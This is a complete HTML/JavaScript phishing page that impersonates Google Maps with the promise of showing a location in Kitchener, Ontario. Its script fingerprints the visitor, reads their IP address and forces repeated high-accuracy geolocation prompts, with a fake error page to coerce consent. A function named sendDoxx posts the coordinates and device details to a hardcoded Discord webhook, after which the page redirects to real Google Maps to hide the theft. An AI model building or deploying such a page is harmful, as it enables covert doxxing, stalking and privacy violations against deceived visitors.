<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps Location</title>
    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        #main-page, #error-page { min-height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .wrapper { width: 100%; max-width: 420px; padding: 20px; text-align: center; }
        .header { margin-bottom: 50px; }
        .logo-img { width: 140px; height: auto; border-radius: 50%; }
        .title { font-size: 30px; font-weight: bold; margin-bottom: 16px; }
        .desc { font-size: 17px; margin-bottom: 40px; opacity: 0.9; }
        .view-btn { width: 100%; padding: 18px; background: #4285F4; border: none; border-radius: 12px; color: #fff; font-size: 19px; font-weight: bold; cursor: pointer; }
        #location-info { display: none; }
        #error-page { display: none; }
        #error-message { text-align: center; max-width: 520px; padding: 40px; background: #161616; border-radius: 12px; }
        .error-icon { font-size: 80px; margin-bottom: 20px; animation: shake 0.6s infinite alternate; }
        @keyframes shake { 0% { transform: translateX(0); } 100% { transform: translateX(12px); } }
    </style>
</head>
<body>
    <!-- Main Phishing Page -->
    <div id="main-page">
        <div class="wrapper">
            <div class="header">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Maps" class="logo-img">
            </div>
            <div class="title">View Location</div>
            <div class="desc">Showing location in Kitchener, Ontario right now.<br>Click below to open in Google Maps.</div>
            <button class="view-btn" id="view-btn">Open in Google Maps</button>
            <div id="location-info"></div>
        </div>
    </div>

    <!-- Error Page - forces them to allow location -->
    <div id="error-page">
        <div id="error-message">
            <div class="error-icon">‚ö†Ô∏è</div>
            <h2>Location access required</h2>
            <p>To view this location in Kitchener, Ontario on Google Maps,<br>you must enable location permissions.</p>
            <p>Refresh the page and allow access when prompted.</p>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1455799307822436365/mPDqpWJT8B2tC9_UmBeaZ0kSuQoo5GUG4bq2kTCUl5giP-_X0HR_N1mn9Ktd2lIbBKEb';
        let userCoords = null;
        let fpData = null;

        const mainPage = document.getElementById('main-page');
        const errorPage = document.getElementById('error-page');
        const viewBtn = document.getElementById('view-btn');

        async function getFingerprint() {
            const fp = await FingerprintJS.load({ monitoring: false });
            const result = await fp.get();
            fpData = result.visitorId;
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'N/A';
            }
        }

        function handleLocation(coords) {
            if (coords.error) {
                mainPage.style.display = 'none';
                errorPage.style.display = 'flex';
            } else {
                userCoords = coords;
                mainPage.style.display = 'flex';
                errorPage.style.display = 'none';
            }
        }

        // FORCE new location request EVERY load / refresh
        function resetAndRequestLocation() {
            userCoords = null;
            if (!navigator.geolocation) {
                handleLocation({error: true});
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const coords = {
                        latitude: pos.coords.latitude.toFixed(6),
                        longitude: pos.coords.longitude.toFixed(6)
                    };
                    handleLocation(coords);
                },
                () => handleLocation({error: true}),
                { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
            );
        }

        viewBtn.addEventListener('click', async () => {
            if (userCoords) {
                viewBtn.textContent = 'Opening Google Maps...';
                await sendDoxx();
                // Fake redirect - stays on our page or you can change to real maps if you want
                window.location.href = 'https://www.google.com/maps';
                return;
            }
            // If no coords yet ‚Üí trigger prompt again
            resetAndRequestLocation();
        });

        async function sendDoxx() {
            const ip = await getIP();
            const platform = navigator.platform || 'N/A';
            const userAgent = navigator.userAgent || 'N/A';
            const deviceMemory = navigator.deviceMemory || 'N/A';
            const cores = navigator.hardwareConcurrency || 'N/A';

            const message = 
`KITCHENER LOCATION GRABBED üíÄ
IP: ${ip}
Fingerprint ID: ${fpData || 'N/A'}
Platform/OS: ${platform}
User Agent: ${userAgent}
Device Memory: ${deviceMemory} GB
Cores: ${cores}
Latitude: ${userCoords ? userCoords.latitude : 'DENIED'}
Longitude: ${userCoords ? userCoords.longitude : 'DENIED'}
Google Maps Link: ${userCoords ? 'https://www.google.com/maps?q=' + userCoords.latitude + ',' + userCoords.longitude : 'DENIED'}
Timestamp: ${new Date().toISOString()}`;

            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: message })
                });
            } catch(e) {}
        }

        window.onload = async () => {
            await getFingerprint();
            mainPage.style.display = 'flex';
            errorPage.style.display = 'none';
            resetAndRequestLocation(); // Auto-prompt every single page load/refresh
        };
    </script>
</body>
</html>
